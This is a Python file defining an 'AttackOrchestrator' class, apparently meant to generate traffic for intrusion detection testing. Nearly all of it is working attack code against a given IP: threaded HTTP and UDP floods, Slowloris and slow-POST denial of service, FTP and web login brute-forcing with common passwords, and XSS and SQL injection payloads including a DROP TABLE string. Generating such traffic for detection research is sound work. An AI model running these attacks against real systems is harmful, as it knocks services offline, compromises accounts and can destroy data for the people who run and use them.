"""
Attack Orchestrator - Implement all 13 attack types
"""
import requests
import time
import threading
import random
import socket
import ftplib
from typing import Optional


class AttackOrchestrator:
    """Orchestrate various network attacks for IDS testing"""
    
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.running = False
        self.threads = []
    
    def stop_all(self):
        """Stop all running attacks"""
        self.running = False
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=1)
        self.threads.clear()
    
    def ddos_hoic(self, duration: int = 60):
        """DDOS attack-HOIC - HTTP flood with multiple threads"""
        print(f"🚨 HOIC DDoS: {self.target_ip} for {duration}s (100 threads)")
        self.running = True
        
        def attack():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    # Send HTTP GET requests rapidly
                    requests.get(f"http://{self.target_ip}/", timeout=1.0)
                    requests.get(f"http://{self.target_ip}/test/", timeout=1.0)
                    requests.get(f"http://{self.target_ip}/index.html", timeout=1.0)
                except:
                    pass
                time.sleep(0.01)  # Small delay to avoid overwhelming
        
        self.threads = [threading.Thread(target=attack, daemon=True) for _ in range(100)]
        for t in self.threads:
            t.start()
        
        # Wait for duration
        time.sleep(duration)
        self.running = False
        print(f"✅ HOIC attack completed")
    
    def ddos_loic_udp(self, duration: int = 60):
        """DDOS attack-LOIC-UDP - UDP flood"""
        print(f"🚨 Starting LOIC UDP on {self.target_ip}")
        self.running = True
        
        def udp_flood():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(b'X' * 1024, (self.target_ip, 80))
                    sock.close()
                except:
                    pass
        
        self.threads = [threading.Thread(target=udp_flood, daemon=True) for _ in range(50)]
        for t in self.threads:
            t.start()
    
    def ddos_loic_http(self, duration: int = 60):
        """DDoS attacks-LOIC-HTTP - HTTP GET flood"""
        print(f"🚨 Starting LOIC HTTP on {self.target_ip}")
        self.running = True
        
        def http_flood():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    requests.get(f"http://{self.target_ip}", timeout=0.1)
                except:
                    pass
        
        self.threads = [threading.Thread(target=http_flood, daemon=True) for _ in range(50)]
        for t in self.threads:
            t.start()
    
    def dos_goldeneye(self, duration: int = 60):
        """DoS attacks-GoldenEye - HTTP keep-alive connections"""
        print(f"🚨 Starting GoldenEye on {self.target_ip}")
        self.running = True
        
        def goldeneye():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    requests.get(f"http://{self.target_ip}", 
                               headers={'Connection': 'keep-alive'}, 
                               timeout=0.1)
                except:
                    pass
        
        self.threads = [threading.Thread(target=goldeneye, daemon=True) for _ in range(100)]
        for t in self.threads:
            t.start()
    
    def dos_hulk(self, duration: int = 60):
        """DoS attacks-Hulk - Random URL requests"""
        print(f"🚨 Starting Hulk on {self.target_ip}")
        self.running = True
        
        def hulk():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    url = f"http://{self.target_ip}/?random={random.randint(0,99999)}&param={random.randint(0,99999)}"
                    requests.get(url, timeout=0.1)
                except:
                    pass
        
        self.threads = [threading.Thread(target=hulk, daemon=True) for _ in range(100)]
        for t in self.threads:
            t.start()
    
    def dos_slowloris(self, duration: int = 60):
        """DoS attacks-Slowloris - Keep connections open"""
        print(f"🚨 Starting Slowloris on {self.target_ip}")
        self.running = True
        
        def slowloris():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.target_ip, 80))
                    s.send(b"GET /? HTTP/1.1\r\n")
                    s.send(f"Host: {self.target_ip}\r\n".encode())
                    s.send(b"User-Agent: Mozilla/5.0\r\n")
                    s.send(b"Accept-language: en-US,en\r\n")
                    time.sleep(10)  # Keep connection open
                    s.close()
                except:
                    pass
        
        self.threads = [threading.Thread(target=slowloris, daemon=True) for _ in range(200)]
        for t in self.threads:
            t.start()
    
    def dos_slowhttptest(self, duration: int = 60):
        """DoS attacks-SlowHTTPTest - Slow HTTP requests"""
        print(f"🚨 Starting SlowHTTPTest on {self.target_ip}")
        self.running = True
        
        def slow_http():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.target_ip, 80))
                    s.send(b"POST / HTTP/1.1\r\n")
                    s.send(f"Host: {self.target_ip}\r\n".encode())
                    s.send(b"Content-Length: 1000000\r\n\r\n")
                    # Send data slowly
                    for _ in range(100):
                        if not self.running:
                            break
                        s.send(b"X")
                        time.sleep(0.1)
                    s.close()
                except:
                    pass
        
        self.threads = [threading.Thread(target=slow_http, daemon=True) for _ in range(50)]
        for t in self.threads:
            t.start()
    
    def brute_force_web(self, duration: int = 60):
        """Brute Force -Web - Multiple login attempts"""
        print(f"🚨 Starting Web brute force on {self.target_ip}")
        self.running = True
        
        usernames = ['admin', 'root', 'user', 'test', 'administrator']
        passwords = ['password', '123456', 'admin', 'root', 'test', '12345678', 'password123']
        
        def brute_force():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                for user in usernames:
                    for pwd in passwords:
                        if not self.running or time.time() >= end_time:
                            break
                        try:
                            requests.post(f"http://{self.target_ip}/login", 
                                        data={'username': user, 'password': pwd}, 
                                        timeout=0.5)
                        except:
                            pass
                        time.sleep(0.1)
        
        self.threads = [threading.Thread(target=brute_force, daemon=True) for _ in range(10)]
        for t in self.threads:
            t.start()
    
    def brute_force_xss(self, duration: int = 60):
        """Brute Force -XSS - XSS payload injection"""
        print(f"🚨 Starting XSS attack on {self.target_ip}")
        self.running = True
        
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">'
        ]
        
        def xss_attack():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                for payload in xss_payloads:
                    if not self.running or time.time() >= end_time:
                        break
                    try:
                        requests.get(f"http://{self.target_ip}/test/?id={payload}", timeout=0.5)
                        requests.get(f"http://{self.target_ip}/search?q={payload}", timeout=0.5)
                    except:
                        pass
                    time.sleep(0.1)
        
        self.threads = [threading.Thread(target=xss_attack, daemon=True) for _ in range(20)]
        for t in self.threads:
            t.start()
    
    def ftp_bruteforce(self, duration: int = 60):
        """FTP-BruteForce - FTP login attempts"""
        print(f"🚨 Starting FTP brute force on {self.target_ip}")
        self.running = True
        
        usernames = ['ftp', 'admin', 'root', 'user', 'test']
        passwords = ['ftp', 'password', '123456', 'admin', 'test']
        
        def brute_force():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                for user in usernames:
                    for pwd in passwords:
                        if not self.running or time.time() >= end_time:
                            break
                        try:
                            ftp = ftplib.FTP(timeout=1)
                            ftp.connect(self.target_ip, 21)
                            ftp.login(user, pwd)
                            ftp.quit()
                        except:
                            pass
                        time.sleep(0.2)
        
        self.threads = [threading.Thread(target=brute_force, daemon=True) for _ in range(10)]
        for t in self.threads:
            t.start()
    
    def sql_injection(self, duration: int = 60):
        """SQL Injection - SQL injection payloads"""
        print(f"🚨 Starting SQL injection on {self.target_ip}")
        self.running = True
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' OR '1'='1",
            "admin'--",
            "' DROP TABLE users--",
            "1' AND '1'='1",
            "1' WAITFOR DELAY '00:00:05'--"
        ]
        
        def sql_inject():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                for payload in sql_payloads:
                    if not self.running or time.time() >= end_time:
                        break
                    try:
                        requests.get(f"http://{self.target_ip}/test/?search={payload}", timeout=0.5)
                        requests.get(f"http://{self.target_ip}/?id={payload}", timeout=0.5)
                        requests.post(f"http://{self.target_ip}/login", 
                                    data={'username': payload, 'password': 'test'}, 
                                    timeout=0.5)
                    except:
                        pass
                    time.sleep(0.1)
        
        self.threads = [threading.Thread(target=sql_inject, daemon=True) for _ in range(20)]
        for t in self.threads:
            t.start()
    
    def ssh_bruteforce(self, duration: int = 60):
        """SSH-Bruteforce - SSH login attempts"""
        print(f"🚨 Starting SSH brute force on {self.target_ip}")
        self.running = True
        
        usernames = ['root', 'admin', 'ubuntu', 'user', 'test']
        passwords = ['password', '123456', 'admin', 'root', 'test', 'ubuntu']
        
        def brute_force():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                for user in usernames:
                    for pwd in passwords:
                        if not self.running or time.time() >= end_time:
                            break
                        try:
                            # Simulate SSH connection attempt
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            sock.connect((self.target_ip, 22))
                            sock.close()
                        except:
                            pass
                        time.sleep(0.2)
        
        self.threads = [threading.Thread(target=brute_force, daemon=True) for _ in range(10)]
        for t in self.threads:
            t.start()
    
    def launch_attack(self, attack_type: str, duration: int = 60):
        """Launch a specific attack type"""
        attack_map = {
            "DDOS attack-HOIC": self.ddos_hoic,
            "DDOS attack-LOIC-UDP": self.ddos_loic_udp,
            "DDoS attacks-LOIC-HTTP": self.ddos_loic_http,
            "DoS attacks-GoldenEye": self.dos_goldeneye,
            "DoS attacks-Hulk": self.dos_hulk,
            "DoS attacks-SlowHTTPTest": self.dos_slowhttptest,
            "DoS attacks-Slowloris": self.dos_slowloris,
            "Brute Force -Web": self.brute_force_web,
            "Brute Force -XSS": self.brute_force_xss,
            "FTP-BruteForce": self.ftp_bruteforce,
            "SQL Injection": self.sql_injection,
            "SSH-Bruteforce": self.ssh_bruteforce
        }
        
        attack_func = attack_map.get(attack_type)
        if attack_func:
            attack_func(duration)
        else:
            available = list(attack_map.keys())
            raise ValueError(f"Unknown attack type: {attack_type}. Available: {available}")

